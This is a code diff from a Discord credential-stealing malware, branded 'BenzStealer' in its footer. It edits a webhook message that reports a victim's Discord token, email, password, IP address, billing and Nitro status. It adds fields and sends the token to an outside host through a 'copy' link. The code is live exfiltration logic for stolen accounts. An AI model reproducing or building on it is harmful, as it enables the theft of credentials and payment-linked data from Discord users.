@@ -584,45 +584,51 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            name: '<a:946246524634009600:990956317101424650> Token:',
+            value: `\`${token}\` [\`Click Token\`](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<:946246524172636161:990956262168617020> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `**${billing}**`,
+            name: '<:946246524285878343:990956250382606376> Nitro:',
+            value: `${nitro}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: '<a:946246524524978196:990956270624325662> Billing:',
+            value: `${billing}`,
+            inline: true,
+          },
+          {
+            name: '<:946246524826968104:990956293919490068> IP:',
+            value: `\`${config.ip}\`\n[IpInfo](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:946246524516581396:990956286189383780> Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
-            value: `\`${config.ip}\``,
-            inline: true,
-          },
-          {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:946246524302655501:990956306355593276> Password:',
             value: `\`${password}\``,
             inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: json.username + '#' + json.discriminator +  ' ('+json.id+') ',
+          url: 'https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif',
         },
         footer: {
-          text: 'BulkFA',
+          text: 'BenzStealer',
+          url: 'https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
